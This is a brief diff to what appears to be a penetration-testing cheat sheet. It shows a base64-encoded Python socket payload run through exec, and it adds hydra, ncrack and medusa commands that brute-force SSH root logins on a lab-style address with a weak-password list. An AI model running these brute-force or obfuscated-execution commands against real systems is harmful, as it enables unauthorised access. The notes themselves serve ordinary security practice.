@@ -51,3 +51,10 @@ print "import socket...".encode(‘base64‘)
 
 python -c "exec('823452v34v234234v….=='.decode('base64'))"
 
+hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ssh
+	-e s -t 10 if server is to weak to spits errors
+	-f to abort if the first usr/pass pair was found
+
+ncrack -p 22 --user root -P 500-worst-passwords.txt 10.10.10.10
+
+medusa -u root -P 500-worst-passwords.txt -h 10.10.10.10 -M ssh
